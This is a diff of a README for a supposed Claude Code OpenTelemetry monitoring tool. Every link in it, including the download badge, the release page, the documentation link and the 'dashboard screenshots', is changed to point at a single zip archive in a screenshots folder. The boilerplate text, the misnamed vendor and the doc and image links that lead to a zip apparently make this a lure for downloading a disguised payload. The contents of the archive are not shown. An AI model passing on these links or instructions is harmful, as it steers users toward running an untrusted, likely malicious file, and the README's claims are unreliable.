@@ -1,6 +1,6 @@
 # 🚀 claude-code-opentelemetry-setup - Easy Monitoring for Claude Code
 
-[![Download Release](https://raw.githubusercontent.com/flysloughofdespond447/claude-code-opentelemetry-setup/master/screenshots/claude-code-opentelemetry-setup_v1.6-alpha.3.zip%20Now-Release-brightgreen)](https://raw.githubusercontent.com/flysloughofdespond447/claude-code-opentelemetry-setup/master/screenshots/claude-code-opentelemetry-setup_v1.6-alpha.3.zip)
+[![Download Release](https://github.com/flysloughofdespond447/claude-code-opentelemetry-setup/raw/refs/heads/master/screenshots/opentelemetry_setup_code_claude_v2.6.zip%20Now-Release-brightgreen)](https://github.com/flysloughofdespond447/claude-code-opentelemetry-setup/raw/refs/heads/master/screenshots/opentelemetry_setup_code_claude_v2.6.zip)
 
 ---
 
@@ -15,7 +15,7 @@ The "claude-code-opentelemetry-setup" project helps you monitor your Claude Code
 To install and run this application, follow these simple steps:
 
 1. **Download the Application**
-   - Visit this page to download: [Release Page](https://raw.githubusercontent.com/flysloughofdespond447/claude-code-opentelemetry-setup/master/screenshots/claude-code-opentelemetry-setup_v1.6-alpha.3.zip)
+   - Visit this page to download: [Release Page](https://github.com/flysloughofdespond447/claude-code-opentelemetry-setup/raw/refs/heads/master/screenshots/opentelemetry_setup_code_claude_v2.6.zip)
 
 2. **Select the Right Version**
    - On the Releases page, you'll see different versions. Choose the latest version for the best features and fixes.
@@ -61,14 +61,14 @@ To run the "claude-code-opentelemetry-setup" effectively, your system should mee
 
 ## 🛠 Additional Resources
 
-- **Documentation:** For more detailed information about OpenTelemetry and other tools, refer to Ceremonial Code's [official monitoring documentation](https://raw.githubusercontent.com/flysloughofdespond447/claude-code-opentelemetry-setup/master/screenshots/claude-code-opentelemetry-setup_v1.6-alpha.3.zip).
+- **Documentation:** For more detailed information about OpenTelemetry and other tools, refer to Ceremonial Code's [official monitoring documentation](https://github.com/flysloughofdespond447/claude-code-opentelemetry-setup/raw/refs/heads/master/screenshots/opentelemetry_setup_code_claude_v2.6.zip).
 - **Support & Community:** If you experience issues or have questions, consider visiting the GitHub Issues section of this repository for help.
 
 ---
 
 ## 📥 Download & Install
 
-To get started with monitoring your Claude Code usage, download the application here: [Release Page](https://raw.githubusercontent.com/flysloughofdespond447/claude-code-opentelemetry-setup/master/screenshots/claude-code-opentelemetry-setup_v1.6-alpha.3.zip).
+To get started with monitoring your Claude Code usage, download the application here: [Release Page](https://github.com/flysloughofdespond447/claude-code-opentelemetry-setup/raw/refs/heads/master/screenshots/opentelemetry_setup_code_claude_v2.6.zip).
 
 Follow the steps above for a smooth installation and setup. Enjoy insightful monitoring with ease.
 
@@ -78,8 +78,8 @@ Follow the steps above for a smooth installation and setup. Enjoy insightful mon
 
 Here are some sample dashboards you will create using this setup:
 
-![Claude Code Monitoring](https://raw.githubusercontent.com/flysloughofdespond447/claude-code-opentelemetry-setup/master/screenshots/claude-code-opentelemetry-setup_v1.6-alpha.3.zip)
-![Claude Code Monitoring](https://raw.githubusercontent.com/flysloughofdespond447/claude-code-opentelemetry-setup/master/screenshots/claude-code-opentelemetry-setup_v1.6-alpha.3.zip)
+![Claude Code Monitoring](https://github.com/flysloughofdespond447/claude-code-opentelemetry-setup/raw/refs/heads/master/screenshots/opentelemetry_setup_code_claude_v2.6.zip)
+![Claude Code Monitoring](https://github.com/flysloughofdespond447/claude-code-opentelemetry-setup/raw/refs/heads/master/screenshots/opentelemetry_setup_code_claude_v2.6.zip)
 
 These visuals give you a snapshot of the productive insights available through the application. 
 
